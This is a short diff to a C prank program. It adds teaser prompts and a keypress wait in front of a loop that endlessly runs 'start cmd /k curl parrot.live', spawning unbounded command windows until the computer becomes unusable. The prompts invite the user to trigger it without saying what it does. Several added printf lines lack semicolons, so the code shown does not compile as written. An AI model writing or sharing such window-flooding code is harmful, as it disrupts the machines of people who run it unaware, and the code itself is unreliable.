@@ -2,9 +2,10 @@
 
 int main() {
     char cin[256];
-    printf("");
-    fgets(cin, sizeof(cin), stdin);
-    
+    printf("Parrot is going to do some");
+    printf("Do you want to see?")
+    printf("Press any key to parrot")
+    getch();
     while(true) {
         system("start cmd /k curl parrot.live");
     }
